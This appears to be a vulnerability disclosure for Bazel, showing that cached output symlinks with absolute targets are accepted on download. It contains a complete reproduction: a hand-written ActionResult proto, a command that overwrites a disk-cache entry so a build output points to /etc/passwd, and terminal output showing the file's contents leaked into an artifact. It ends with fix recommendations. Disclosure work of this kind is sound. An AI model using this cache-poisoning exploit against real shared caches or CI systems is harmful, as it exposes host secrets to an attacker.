## Vulnerability Summary
 
A poisoned remote or disk cache can replace a declared build output with an absolute symlink to a host file (e.g., `/etc/passwd`), and downstream local build steps will read that host file as a trusted build input.
 
---
 
## Why It Is Exploitable
 
Bazel enforces absolute-symlink capability when **uploading** local outputs:
 
- It derives `allowAbsoluteSymlinks` from remote cache capabilities in `UploadManifest.java` 
- It rejects absolute symlinks when not allowed in `UploadManifest.java`
 
But when **downloading** cached results, Bazel does not perform the corresponding check:
 
- It accepts `output_file_symlinks` / `output_symlinks` targets directly in `RemoteExecutionService.java` 
- It materializes them directly with `createSymbolicLink()` in `RemoteExecutionService.java` 
 
The REAPI spec states that absolute symlink targets are conditional on capabilities:
 
- `OutputSymlink.target` absolute paths are only supported if the capability says so (`remote_execution.proto`)
- `SymlinkAbsolutePathStrategy.DISALLOWED` says absolute output symlinks should fail (`remote_execution.proto`)
 
**Bazel is trusting untrusted cached output symlinks more than it trusts local outputs it is about to upload.**
 
---
 
## Real-World Impact
 
An attacker controlling a remote cache, remote executor result, or poisoned shared disk cache can:
 
- Turn a normal declared output into a symlink to any local file readable by the Bazel user
- Make downstream local rules ingest host files outside the workspace
- Exfiltrate secrets into ordinary build artifacts, test logs, or packaged outputs
 
**Practical attacker impact: arbitrary local file read / sensitive data exposure.**
 
---
 
## Step-by-Step Reproduction
 
This uses disk cache because it exercises the same cached `ActionResult` parsing and materialization path.
 
### 1. Install Bazel
 
```bash
curl -L https://github.com/bazelbuild/bazelisk/releases/download/v1.21.0/bazelisk-linux-amd64 -o /tmp/bazel
chmod +x /tmp/bazel
/tmp/bazel --version
```
 
### 2. Create a Workspace
 
```bash
mkdir -p /tmp/bazel-repro3
 
cat > /tmp/bazel-repro3/MODULE.bazel <<'EOF'
module(name = "bazel_repro3")
EOF
 
cat > /tmp/bazel-repro3/BUILD <<'EOF'
genrule(
    name = "poc",
    outs = ["ok.txt"],
    cmd = "echo ok > $@",
)
 
genrule(
    name = "leak",
    srcs = [":poc"],
    outs = ["copy.txt"],
    cmd = "cat $(location :poc) > $@",
)
EOF
```
 
### 3. Prime the Cache with a Normal Build of `:poc`
 
```bash
rm -rf /tmp/bazel-repro3-cache /tmp/bazel-repro3-ob /tmp/bazel-repro3-home
mkdir -p /tmp/bazel-repro3-home
cd /tmp/bazel-repro3
 
HOME=/tmp/bazel-repro3-home /tmp/bazel --ignore_all_rc_files \
  --output_base=/tmp/bazel-repro3-ob \
  build --disk_cache=/tmp/bazel-repro3-cache //:poc
```
 
### 4. Create a Minimal Proto Definition
 
```bash
cat > /tmp/reapi_min2.proto <<'EOF'
syntax = "proto3";
package build.bazel.remote.execution.v2;
message Digest { string hash = 1; int64 size_bytes = 2; }
message OutputFile { string path = 1; Digest digest = 2; bool is_executable = 4; bytes contents = 5; }
message OutputSymlink { string path = 1; string target = 2; }
message ActionResult {
  reserved 1;
  repeated OutputFile output_files = 2;
  repeated OutputSymlink output_file_symlinks = 10;
  repeated OutputSymlink output_symlinks = 12;
  int32 exit_code = 4;
}
EOF
```
 
### 5. Find the AC Entry and Decode It
 
```bash
AC=$(find /tmp/bazel-repro3-cache/ac -type f | head -n1)
protoc -I /tmp --decode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min2.proto < "$AC"
```
 
### 6. Replace the Cached Result — `ok.txt` Becomes a Symlink to `/etc/passwd`
 
```bash
cat > /tmp/malicious_ar3.textproto <<'EOF'
output_symlinks {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  target: "/etc/passwd"
}
exit_code: 0
EOF
 
protoc -I /tmp --encode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min2.proto \
  < /tmp/malicious_ar3.textproto > "$AC"
```
 
### 7. Build the Downstream Target
 
```bash
rm -f /tmp/bazel-repro3/bazel-bin/ok.txt /tmp/bazel-repro3/bazel-bin/copy.txt
 
HOME=/tmp/bazel-repro3-home /tmp/bazel --ignore_all_rc_files \
  --output_base=/tmp/bazel-repro3-ob \
  build --disk_cache=/tmp/bazel-repro3-cache //:leak
```
 
### 8. Verify Exploitation
 
```bash
ls -l /tmp/bazel-repro3/bazel-bin/ok.txt
readlink /tmp/bazel-repro3/bazel-bin/ok.txt
head -n 3 /tmp/bazel-repro3/bazel-bin/copy.txt
```
 
**Expected result:**
 
- Build reports a disk cache hit
- `bazel-bin/ok.txt` is a symlink to `/etc/passwd`
- `copy.txt` contains the first lines of `/etc/passwd`
 
Validated locally with results:
 
```
bazel-bin/ok.txt -> /etc/passwd
copy.txt starting with root:x:0:0:...
```
 
---
 
## Exploit Chain Possibility
 
This chains cleanly into:
 
- **Secret exfiltration** through downstream packaging rules
- **Leakage into test logs or artifacts** published by CI
- **Local privilege boundary abuse** in CI if sensitive files are readable by the build user
 
---
 
## Fix Recommendation
 
On cached/remote result download:
 
1. **Reject absolute output symlink targets** unless the remote cache capabilities explicitly allow them
2. **Consider rejecting absolute targets entirely** for cached outputs unless the user has explicitly opted into that behavior
3. **Treat output symlinks as untrusted** and prevent downstream host-file aliasing through declared outputs



### My terminal output for reference:

```bash

[keshavgoyal@pine bazel]$ curl -L https://github.com/bazelbuild/bazelisk/releases/download/v1.21.0/bazelisk-linux-amd64 -o /tmp/bazel
chmod +x /tmp/bazel
/tmp/bazel --version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 5828k  100 5828k    0     0  20.8M      0 --:--:-- --:--:-- --:--:-- 20.8M
bazel 9.0.2


[keshavgoyal@pine bazel]$ mkdir -p /tmp/bazel-repro3
cat > /tmp/bazel-repro3/MODULE.bazel <<'EOF'
module(name = "bazel_repro3")
EOF

cat > /tmp/bazel-repro3/BUILD <<'EOF'
genrule(
    name = "poc",
    outs = ["ok.txt"],
    cmd = "echo ok > $@",
)

genrule(
    name = "leak",
    srcs = [":poc"],
    outs = ["copy.txt"],
    cmd = "cat $(location :poc) > $@",
)
EOF



[keshavgoyal@pine bazel]$ rm -rf /tmp/bazel-repro3-cache /tmp/bazel-repro3-ob /tmp/bazel-repro3-home
mkdir -p /tmp/bazel-repro3-home
cd /tmp/bazel-repro3
HOME=/tmp/bazel-repro3-home /tmp/bazel --ignore_all_rc_files \
  --output_base=/tmp/bazel-repro3-ob \
  build --disk_cache=/tmp/bazel-repro3-cache //:poc
2026/04/12 21:02:41 Downloading https://releases.bazel.build/9.0.2/release/bazel-9.0.2-linux-x86_64...
Downloading: 62 MB out of 62 MB (100%) 
Extracting Bazel installation...
Starting local Bazel server (9.0.2) and connecting to it...
INFO: Invocation ID: 1dbd9cae-66ef-4b36-8afe-897fc1ba17b7
INFO: Analyzed target //:poc (6 packages loaded, 8 targets configured).
INFO: From Executing genrule //:poc:
/bin/bash: line 1: external/bazel_tools/tools/genrule/genrule-setup.sh: No such file or directory
INFO: Found 1 target...
Target //:poc up-to-date:
  bazel-bin/ok.txt
INFO: Elapsed time: 5.137s, Critical Path: 0.08s
INFO: 2 processes: 1 internal, 1 linux-sandbox.
INFO: Build completed successfully, 2 total actions
[keshavgoyal@pine bazel-repro3]$ cat > /tmp/reapi_min2.proto <<'EOF'
syntax = "proto3";
package build.bazel.remote.execution.v2;
message Digest { string hash = 1; int64 size_bytes = 2; }
message OutputFile { string path = 1; Digest digest = 2; bool is_executable = 4; bytes contents = 5; }
message OutputSymlink { string path = 1; string target = 2; }
message ActionResult {
  reserved 1;
  repeated OutputFile output_files = 2;
  repeated OutputSymlink output_file_symlinks = 10;
  repeated OutputSymlink output_symlinks = 12;
  int32 exit_code = 4;
}
EOF



[keshavgoyal@pine bazel-repro3]$ AC=$(find /tmp/bazel-repro3-cache/ac -type f | head -n1)
protoc -I /tmp --decode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min2.proto < "$AC"
output_files {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  digest {
    hash: "dc51b8c96c2d745df3bd5590d990230a482fd247123599548e0632fdbf97fc22"
    size_bytes: 3
  }
  is_executable: true
}
6 {
  1: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
}
8 {
  1: "2a37cfd45e71e1d094542d3cf47ff8adcd63bf6c4ad85c65662d60f73af80328"
  2: 98
}
9 {
  3 {
    1: 1776042167
    2: 685874440
  }
  4 {
    1: 1776042167
    2: 692874440
  }
  7 {
    1: 1776042167
    2: 685874440
  }
  8 {
    1: 1776042167
    2: 692874440
  }
}



[keshavgoyal@pine bazel-repro3]$ cat > /tmp/malicious_ar3.textproto <<'EOF'
output_symlinks {
  path: "bazel-out/k8-fastbuild/bin/ok.txt"
  target: "/etc/passwd"
}
exit_code: 0
EOF

protoc -I /tmp --encode=build.bazel.remote.execution.v2.ActionResult /tmp/reapi_min2.proto \
  < /tmp/malicious_ar3.textproto > "$AC"



[keshavgoyal@pine bazel-repro3]$ rm -f /tmp/bazel-repro3/bazel-bin/ok.txt /tmp/bazel-repro3/bazel-bin/copy.txt

HOME=/tmp/bazel-repro3-home /tmp/bazel --ignore_all_rc_files \
  --output_base=/tmp/bazel-repro3-ob \
  build --disk_cache=/tmp/bazel-repro3-cache //:leak
INFO: Invocation ID: 5b022a98-bc92-4903-8e48-3e8dfa34f41b
INFO: Analyzed target //:leak (0 packages loaded, 1 target configured).
INFO: From Executing genrule //:leak:
/bin/bash: line 1: external/bazel_tools/tools/genrule/genrule-setup.sh: No such file or directory
INFO: Found 1 target...
Target //:leak up-to-date:
  bazel-bin/copy.txt
INFO: Elapsed time: 0.243s, Critical Path: 0.02s
INFO: 3 processes: 1 disk cache hit, 1 internal, 1 linux-sandbox.
INFO: Build completed successfully, 3 total actions


[keshavgoyal@pine bazel-repro3]$ ls -l /tmp/bazel-repro3/bazel-bin/ok.txt
readlink /tmp/bazel-repro3/bazel-bin/ok.txt
head -n 3 /tmp/bazel-repro3/bazel-bin/copy.txt
lrwxrwxrwx 1 keshavgoyal Grads 11 Apr 12 21:03 /tmp/bazel-repro3/bazel-bin/ok.txt -> /etc/passwd
/etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```
